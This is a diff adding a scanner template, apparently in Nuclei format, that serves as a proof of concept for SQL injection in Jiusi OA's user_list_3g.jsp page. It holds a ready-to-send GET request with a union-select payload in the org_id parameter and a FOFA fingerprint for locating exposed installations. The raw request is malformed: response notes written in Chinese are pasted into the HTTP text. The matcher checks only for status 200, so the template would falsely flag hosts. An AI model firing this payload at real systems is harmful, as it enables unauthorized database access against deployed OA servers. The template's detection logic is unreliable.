@@ -1,0 +1,40 @@
+id: poc-mbcc5uzun9l96hqq
+info:
+  name: 九思OA user_list_3g.jsp SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mbcc5uzun9l96hqq'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mbcc5uzun9l96hqq
+    fofa: app="九思软件-OA"
+http:
+- raw:
+  - 'GET /jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/1,md5(1)%20%23 HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    b923820dcc
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
